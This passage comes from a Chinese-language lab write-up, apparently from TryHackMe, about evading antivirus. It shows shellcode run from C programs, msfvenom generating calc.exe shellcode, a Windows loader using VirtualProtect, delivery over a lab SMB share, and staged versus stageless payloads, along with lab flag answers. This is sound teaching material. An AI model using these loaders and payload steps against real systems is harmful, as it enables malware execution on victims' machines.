50;\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u6700\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u5b83\uff0c\u4e00\u4e2a\u6765\u81ea\u6211\u4eecASM\u6c47\u7f16\u7684\u683c\u5f0f\u5316shellcode\u3002 \u8fd9\u5f88\u6709\u8da3\uff01 \u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u4e3a\u4f60\u7684\u5de5\u4f5c\u751f\u6210shellcode\u9700\u8981\u5949\u732e\u7cbe\u795e\u548c\u6280\u80fd\uff01"}),"\n",(0,d.jsx)(n.p,{children:"\u4e3a\u4e86\u786e\u8ba4\u63d0\u53d6\u7684shellcode\u6309\u6211\u4eec\u9884\u671f\u7684\u65b9\u5f0f\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684shellcode\u5e76\u5c06\u5176\u6ce8\u5165\u5230C\u7a0b\u5e8f\u4e2d\u3002"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-c",children:"#include <stdio.h>\n\nint main(int argc, char **argv) {\n    unsigned char message[] = {\n        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,\n        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,\n        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,\n        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,\n        0x0d, 0x0a\n    };\n    \n    (*(void(*)())message)();\n    return 0;\n}\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u7136\u540e\uff0c\u6211\u4eec\u6309\u5982\u4e0b\u65b9\u5f0f\u7f16\u8bd1\u5e76\u6267\u884c\u5b83\uff0c"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Compiler our C program"',children:"user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx\nuser@AttackBox$ ./thmx\nTHM,Rocks!\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u5f88\u597d\uff01 \u5b83\u8d77\u4f5c\u7528\u4e86\u3002 \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u901a\u8fc7\u7981\u7528NX\u4fdd\u62a4\u6765\u7f16\u8bd1C\u7a0b\u5e8f\uff0c\u8fd9\u53ef\u80fd\u4f1a\u963b\u6b62\u6211\u4eec\u5728\u6570\u636e\u6bb5\u6216\u5806\u6808\u4e2d\u6b63\u786e\u6267\u884c\u4ee3\u7801\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u7406\u89e3shellcode\u53ca\u5176\u521b\u5efa\u65b9\u5f0f\u5bf9\u4e8e\u4ee5\u4e0b\u4efb\u52a1\u81f3\u5173\u91cd\u8981\uff0c\u5c24\u5176\u662f\u5728\u5904\u7406shellcode\u7684\u52a0\u5bc6\u548c\u7f16\u7801\u65f6\u3002"}),"\n",(0,d.jsx)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u4fee\u6539\u60a8\u7684C\u7a0b\u5e8f\u4ee5\u6267\u884c\u4ee5\u4e0bshellcode\u3002 \u6807\u5fd7\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-c",children:"unsigned char message[] = {\n  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,\n  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,\n  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,\n  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,\n  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,\n  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,\n  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a\n};\n"})}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"THM{y0ur-1s7-5h311c0d3}\n"})})]})}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a15-\u751f\u6210shellcode",children:"\u4efb\u52a15 \u751f\u6210Shellcode"}),"\n",(0,d.jsx)(n.p,{children:"\u5728\u672c\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528shellcode\uff0c\u5e76\u6f14\u793a\u5982\u4f55\u4f7f\u7528\u516c\u5171\u5de5\u5177\uff08\u5982Metasploit\u6846\u67b6\uff09\u751f\u6210\u548c\u6267\u884cshellcode\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210shellcode",children:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210Shellcode"}),"\n",(0,d.jsx)(n.p,{children:"Shellcode\u53ef\u4ee5\u9488\u5bf9\u7279\u5b9a\u683c\u5f0f\u548c\u7279\u5b9a\u7f16\u7a0b\u8bed\u8a00\u751f\u6210\u3002 \u8fd9\u53d6\u51b3\u4e8e\u60a8\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u60a8\u7684\u6295\u653e\u5668\uff08\u5373\u4e3b\u8981\u7684exe\u6587\u4ef6\uff09\u5305\u542b\u5c06\u53d1\u9001\u7ed9\u53d7\u5bb3\u8005\u7684shellcode\uff0c\u5e76\u4e14\u662f\u7528C\u7f16\u5199\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u5728C\u4e2d\u53ef\u7528\u7684shellcode\u683c\u5f0f\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u901a\u8fc7\u516c\u5171\u5de5\u5177\u751f\u6210shellcode\u7684\u4f18\u70b9\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4ece\u5934\u5f00\u59cb\u5236\u4f5c\u81ea\u5b9a\u4e49shellcode\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u6210\u4e3a\u6c47\u7f16\u8bed\u8a00\u4e13\u5bb6\u3002 \u5927\u591a\u6570\u516c\u5171C2\u6846\u67b6\u90fd\u63d0\u4f9b\u81ea\u5df1\u7684shellcode\u751f\u6210\u5668\uff0c\u4e0eC2\u5e73\u53f0\u517c\u5bb9\u3002 \u5f53\u7136\uff0c\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u975e\u5e38\u65b9\u4fbf\uff0c\u4f46\u7f3a\u70b9\u662f\u5927\u591a\u6570\uff08\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u8bf4\u6240\u6709\uff09\u751f\u6210\u7684shellcode\u90fd\u88abAV\u4f9b\u5e94\u5546\u719f\u77e5\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f7b\u677e\u68c0\u6d4b\u5230\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u5728AttackBox\u4e0a\u4f7f\u7528Msfvenom\u751f\u6210\u4e00\u4e2a\u6267\u884cWindows\u6587\u4ef6\u7684shellcode\u3002 \u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a\u8fd0\u884c",(0,d.jsx)(n.code,{children:"calc.exe"}),"\u5e94\u7528\u7a0b\u5e8f\u7684shellcode\u3002"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Generate Shellcode to Execute calc.exe"',children:'user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c\nNo encoder specified, outputting raw payload\nPayload size: 193 bytes\nFinal size of c file: 835 bytes\nunsigned char buf[] =\n"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30"\n"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"\n"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52"\n"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1"\n"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b"\n"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03"\n"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b"\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24"\n"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb"\n"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f"\n"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5"\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a"\n"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00";\n'})}),"\n",(0,d.jsx)(n.p,{children:"\u7ed3\u679c\uff0cMetasploit\u6846\u67b6\u751f\u6210\u4e86\u4e00\u4e2a\u6267\u884cWindows\u8ba1\u7b97\u5668\uff08calc.exe\uff09\u7684shellcode\u3002 Windows\u8ba1\u7b97\u5668\u5728\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u88ab\u5e7f\u6cdb\u7528\u4f5c\u793a\u4f8b\uff0c\u4ee5\u5c55\u793a\u6982\u5ff5\u9a8c\u8bc1\u3002 \u5982\u679c\u8be5\u6280\u672f\u6709\u6548\uff0c\u5219\u4f1a\u5f39\u51fa\u4e00\u4e2a\u65b0\u7684Windows\u8ba1\u7b97\u5668\u5b9e\u4f8b\u3002 \u8fd9\u786e\u8ba4\u4e86\u4efb\u4f55\u53ef\u6267\u884c\u7684shellcode\u90fd\u53ef\u4ee5\u4e0e\u6240\u4f7f\u7528\u7684\u65b9\u6cd5\u4e00\u8d77\u5de5\u4f5c\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"shellcode\u6ce8\u5165",children:"Shellcode\u6ce8\u5165"}),"\n",(0,d.jsx)(n.p,{children:"\u9ed1\u5ba2\u4f7f\u7528\u5404\u79cd\u6280\u672f\u5c06shellcode\u6ce8\u5165\u5230\u6b63\u5728\u8fd0\u884c\u7684\u6216\u65b0\u7684\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u4e2d\u3002 Shellcode\u6ce8\u5165\u6280\u672f\u4fee\u6539\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4ee5\u66f4\u65b0\u7a0b\u5e8f\u7684\u5bc4\u5b58\u5668\u548c\u51fd\u6570\uff0c\u4ece\u800c\u6267\u884c\u653b\u51fb\u8005\u81ea\u5df1\u7684\u4ee3\u7801\u3002"}),"\n",(0,d.jsx)(n.p,{children:'\u73b0\u5728\u8ba9\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u751f\u6210\u7684shellcode\u5e76\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u5b83\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e2a\u5305\u542b\u6211\u4eec\u751f\u6210\u7684shellcode\u7684C\u4ee3\u7801\uff0c\u8be5shellcode\u5c06\u88ab\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\u5e76\u6267\u884c"calc.exe"\u3002'}),"\n",(0,d.jsxs)(n.p,{children:["\u5728AttackBox\u4e0a\uff0c\u8ba9\u6211\u4eec\u5c06\u4ee5\u4e0b\u5185\u5bb9\u4fdd\u5b58\u5230\u540d\u4e3a",(0,d.jsx)(n.code,{children:"calc.c"}),"\u7684\u6587\u4ef6\u4e2d\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-c",children:'#include <windows.h>\nchar stager[] = {\n"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30"\n"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"\n"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52"\n"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1"\n"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b"\n"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03"\n"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b"\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24"\n"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb"\n"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f"\n"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5"\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a"\n"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00" };\nint main()\n{\n        DWORD oldProtect;\n        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);\n        int (*shellcode)() = (int(*)())(void*)stager;\n        shellcode();\n}\n'})}),"\n",(0,d.jsx)(n.p,{children:"\u73b0\u5728\u8ba9\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3aexe\u6587\u4ef6\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Compile our C program for Windows"',children:"user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u4e00\u65e6\u6211\u4eec\u6709\u4e86exe\u6587\u4ef6\uff0c\u8ba9\u6211\u4eec\u5c06\u5176\u4f20\u8f93\u5230Windows\u673a\u5668\u5e76\u6267\u884c\u5b83\u3002 \u8981\u4f20\u8f93\u6587\u4ef6\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528AttackBox\u4e0a\u7684smbclient\u8bbf\u95ee",(0,d.jsx)(n.code,{children:"\\\\MACHINE_IP\\Tools"}),"\u5904\u7684SMB\u5171\u4eab\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff08\u8bb0\u4f4f",(0,d.jsx)(n.code,{children:"thm"}),"\u7528\u6237\u7684\u5bc6\u7801\u662f",(0,d.jsx)(n.code,{children:"Password321"}),"\uff09\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Copy calc-MSC.exe to Windows Machine"',children:"user@AttackBox$ smbclient -U thm '//10.82.134.191/Tools'\nsmb: \\> put calc-MSF.exe\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u8fd9\u5e94\u8be5\u4f1a\u5728Windows\u673a\u5668\u7684",(0,d.jsx)(n.code,{children:"C:\\Tools\\"}),"\u4e2d\u590d\u5236\u60a8\u7684\u6587\u4ef6\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u867d\u7136\u60a8\u7684\u673a\u5668\u7684AV\u5e94\u8be5\u88ab\u7981\u7528\uff0c\u4f46\u8bf7\u968f\u610f\u5c1d\u8bd5\u5c06\u60a8\u7684\u6709\u6548\u8d1f\u8f7d\u4e0a\u4f20\u5230THM Antivirus Check\uff0c\u5730\u5740\u4e3a",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"}),"\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u6267\u884cMSF\u6709\u6548\u8d1f\u8f7d\u4ee5\u8fd0\u884ccalc.exe",src:s(9596).A+"",width:"1240",height:"599"})}),"\n",(0,d.jsx)(n.p,{children:"Metasploit\u6846\u67b6\u6709\u8bb8\u591a\u5176\u4ed6shellcode\u683c\u5f0f\u548c\u7c7b\u578b\uff0c\u53ef\u6ee1\u8db3\u60a8\u7684\u6240\u6709\u9700\u6c42\u3002 \u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u60a8\u66f4\u591a\u5730\u8bd5\u9a8c\u5b83\uff0c\u5e76\u901a\u8fc7\u751f\u6210\u4e0d\u540c\u7684shellcode\u6765\u6269\u5c55\u60a8\u7684\u77e5\u8bc6\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u524d\u9762\u7684\u793a\u4f8b\u5c55\u793a\u4e86\u5982\u4f55\u751f\u6210shellcode\u5e76\u5728\u76ee\u6807\u673a\u5668\u4e2d\u6267\u884c\u5b83\u3002 \u5f53\u7136\uff0c\u60a8\u53ef\u4ee5\u590d\u5236\u76f8\u540c\u7684\u6b65\u9aa4\u6765\u521b\u5efa\u4e0d\u540c\u7c7b\u578b\u7684shellcode\uff0c\u4f8b\u5982Meterpreter shellcode\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u4eceexe\u6587\u4ef6\u751f\u6210shellcode",children:"\u4eceEXE\u6587\u4ef6\u751f\u6210Shellcode"}),"\n",(0,d.jsxs)(n.p,{children:["Shellcode\u4e5f\u53ef\u4ee5\u5b58\u50a8\u5728",(0,d.jsx)(n.code,{children:".bin"}),"\u6587\u4ef6\u4e2d\uff0c\u8fd9\u662f\u4e00\u79cd\u539f\u59cb\u6570\u636e\u683c\u5f0f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528",(0,d.jsx)(n.code,{children:"xxd -i"}),"\u547d\u4ee4\u83b7\u53d6\u5176shellcode\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["C2\u6846\u67b6\u5c06shellcode\u4f5c\u4e3a\u539f\u59cb\u4e8c\u8fdb\u5236\u6587\u4ef6",(0,d.jsx)(n.code,{children:".bin"}),"\u63d0\u4f9b\u3002 \u5982\u679c\u662f\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Linux\u7cfb\u7edf\u547d\u4ee4",(0,d.jsx)(n.code,{children:"xxd"}),"\u6765\u83b7\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u8868\u793a\u3002 \u4e3a\u6b64\uff0c\u6211\u4eec\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a",(0,d.jsx)(n.code,{children:"xxd -i"}),"\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u4f7f\u7528msfvenom\u521b\u5efa\u4e00\u4e2a\u539f\u59cb\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u83b7\u53d6shellcode\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Generate a Raw shellcode to Execute calc.exe"',children:"user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin\nNo encoder specified, outputting raw payload\nPayload size: 193 bytes\n\nuser@AttackBox$ file /tmp/example.bin\n/tmp/example.bin: data\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u5e76\u5728\u521b\u5efa\u7684\u6587\u4ef6\u4e0a\u8fd0\u884c",(0,d.jsx)(n.code,{children:"xxd"}),"\u547d\u4ee4\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Get the shellcode using the xxd command"',children:"user@AttackBox$ xxd -i /tmp/example.bin\nunsigned char _tmp_example_bin[] = {\n  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,\n  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,\n  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,\n  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,\n  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,\n  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,\n  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,\n  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,\n  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,\n  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,\n  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,\n  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,\n  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,\n  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,\n  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,\n  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,\n  0x00\n};\nunsigned int _tmp_example_bin_len = 193;\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u5c06\u8f93\u51fa\u4e0e\u4e4b\u524d\u4f7f\u7528Metasploit\u521b\u5efa\u7684shellcode\u8fdb\u884c\u6bd4\u8f83\uff0c\u5b83\u4eec\u662f\u5339\u914d\u7684\u3002"}),"\n",(0,d.jsx)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5e94\u7528\u6211\u4eec\u5728\u672c\u4efb\u52a1\u4e2d\u8ba8\u8bba\u7684\u5185\u5bb9\uff0c\u4e3a\u4e0b\u4e00\u4e2a\u4e3b\u9898\u505a\u597d\u51c6\u5907\uff01 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-6-\u5206\u9636\u6bb5\u8f7d\u8377",children:"\u4efb\u52a1 6 \u5206\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u6211\u4eec\u7684\u76ee\u6807\u4e2d\u7ed5\u8fc7 AV\uff0c\u6211\u4eec\u5c06\u627e\u5230\u4e24\u79cd\u4e3b\u8981\u65b9\u6cd5\u6765\u5411\u53d7\u5bb3\u8005\u4ea4\u4ed8\u6700\u7ec8\u7684 shellcode\u3002 \u6839\u636e\u65b9\u6cd5\u7684\u4e0d\u540c\uff0c\u60a8\u4f1a\u53d1\u73b0\u8f7d\u8377\u901a\u5e38\u88ab\u5206\u7c7b\u4e3a",(0,d.jsx)(n.strong,{children:"\u5206\u9636\u6bb5"}),"\u6216",(0,d.jsx)(n.strong,{children:"\u65e0\u9636\u6bb5"}),"\u8f7d\u8377\u3002 \u5728\u672c\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u63a2\u8ba8\u4e24\u79cd\u65b9\u6cd5\u7684\u5dee\u5f02\u4ee5\u53ca\u6bcf\u79cd\u65b9\u6cd5\u7684\u4f18\u52bf\u3002"]}),"\n",(0,d.jsx)(n.h3,{id:"\u65e0\u9636\u6bb5\u8f7d\u8377",children:"\u65e0\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,d.jsxs)(n.p,{children:["\u65e0\u9636\u6bb5\u8f7d\u8377\u5c06\u6700\u7ec8\u7684 shellcode \u76f4\u63a5\u5d4c\u5165\u5230\u81ea\u8eab\u4e2d\u3002 \u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u5355\u6b65\u8fc7\u7a0b\u6267\u884c shellcode\u3002 \u5728\u4e4b\u524d\u7684\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5d4c\u5165\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5d4c\u5165\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 ",(0,d.jsx)(n.code,{children:"calc"})," shellcode\uff0c\u4ece\u800c\u521b\u5efa\u4e86\u4e00\u4e2a\u65e0\u9636\u6bb5\u8f7d\u8377\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u65e0\u9636\u6bb5\u8f7d\u8377",src:s(496).A+"",width:"1386",height:"364"})}),"\n",(0,d.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u5f53\u7528\u6237\u6267\u884c\u6076\u610f\u8f7d\u8377\u65f6\uff0c\u5d4c\u5165\u7684 shellcode \u5c06\u8fd0\u884c\uff0c\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u53cd\u5411 shell\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u5206\u9636\u6bb5\u8f7d\u8377",children:"\u5206\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,d.jsxs)(n.p,{children:["\u5206\u9636\u6bb5\u8f7d\u8377\u901a\u8fc7\u4f7f\u7528\u4e2d\u95f4 shellcode \u6765\u5de5\u4f5c\uff0c\u8fd9\u4e9b\u4e2d\u95f4 shellcode \u4f5c\u4e3a\u6267\u884c\u6700\u7ec8 shellcode \u7684\u6b65\u9aa4\u3002 \u8fd9\u4e9b\u4e2d\u95f4 shellcode \u4e2d\u7684\u6bcf\u4e00\u4e2a\u88ab\u79f0\u4e3a",(0,d.jsx)(n.strong,{children:"\u9636\u6bb5\u5668"}),"\uff0c\u5176\u4e3b\u8981\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u79cd\u65b9\u6cd5\u6765\u68c0\u7d22\u6700\u7ec8\u7684 shellcode \u5e76\u6700\u7ec8\u6267\u884c\u5b83\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u867d\u7136\u53ef\u80fd\u5b58\u5728\u5177\u6709\u591a\u4e2a\u9636\u6bb5\u7684\u8f7d\u8377\uff0c\u4f46\u901a\u5e38\u60c5\u51b5\u6d89\u53ca\u4e00\u4e2a\u4e24\u9636\u6bb5\u8f7d\u8377\uff0c\u5176\u4e2d\u7b2c\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a",(0,d.jsx)(n.strong,{children:"\u9636\u6bb50"}),"\uff0c\u662f\u4e00\u4e2a\u5b58\u6839 shellcode\uff0c\u5b83\u5c06\u8fde\u63a5\u56de\u653b\u51fb\u8005\u7684\u673a\u5668\u4ee5\u4e0b\u8f7d\u8981\u6267\u884c\u7684\u6700\u7ec8 shellcode\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u5206\u9636\u6bb5\u8f7d\u8377 - 